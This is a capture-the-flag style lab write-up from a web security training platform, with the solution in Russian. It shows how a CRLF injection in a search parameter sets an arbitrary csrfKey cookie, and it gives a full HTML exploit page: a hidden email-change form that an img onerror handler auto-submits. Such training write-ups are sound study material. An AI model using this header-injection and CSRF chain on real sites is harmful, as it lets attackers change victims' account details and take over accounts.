# CSRF where token is tied to non-session cookie
PRACTITIONER

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

## Решение
В приложении существует уязвимость CRLF Injection в функционале поиска:
```
GET /?search=test HTTP/2
Host: 0a78005803ffc2c6805e214e00600058.web-security-academy.net
Cookie: session=4YJWYdRSbSl0q3pFSFJyXWMysH8etdIK; csrfKey=DgE7UU7ND8ednvVrGGCjUczFruMryf4s
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a78005803ffc2c6805e214e00600058.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```
Поисковой запрос "test" встраивается внутрь заголовка Set-Cookie:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5053
```
Если передать в поле поиска символ переноса строки `%0d%0a`, то можно устанавливать произвольные HTTP-заголовки:
```
GET /?search=test%0d%0ax:1 HTTP/2
```
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
X: 1; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3425
```
Таким способом можно установить произвольный кукис с помощью GET-запроса.

Чтобы сменить пользователю пароль, эксплойт должен содержать валидный CSRF-токен и устанавливать кукис csrfKey из сессии, которой этот токен принадлежит. Установка кукиса осуществляется GET-запросом через CRLFi (тэг img):
```
<html>
<body>
    <form action="https://0a5f005b041b454680f93a1600f00077.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="wiener123@normal-user.net" />
        <input required="" type="hidden" name="csrf" value="aknp0715lH2quctmN4FrqGd2ept2ZqAU" />
    </form>
    <img src="https://0a5f005b041b454680f93a1600f00077.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=TvwHmX0snfxSOqgfKzSIbOPGkIcW8M08%3b%20SameSite=None" onerror="document.forms[0].submit()" >
</body>
</html>
```
Задание выполнено.
